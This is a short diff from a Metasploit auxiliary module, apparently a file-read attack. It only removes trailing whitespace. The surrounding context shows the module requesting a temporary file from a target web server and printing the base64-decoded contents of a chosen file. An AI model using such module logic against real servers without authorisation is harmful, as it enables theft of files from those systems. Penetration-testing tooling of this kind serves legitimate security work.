@@ -56,13 +56,13 @@ class Metasploit3 < Msf::Auxiliary
 			if (res and res.code == 500)
 
 				print_status("Request appears successful on #{rhost}:#{rport}! Response: #{res.code}")
-				
+
 				file = send_request_raw(
 					{
 						'method'  => 'GET',
 						'uri'     => '/' + tmpfile,
 					}, 25)
-				
+
 				if (file and file.code == 200)
 					print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
 				elsif (file and file.code)
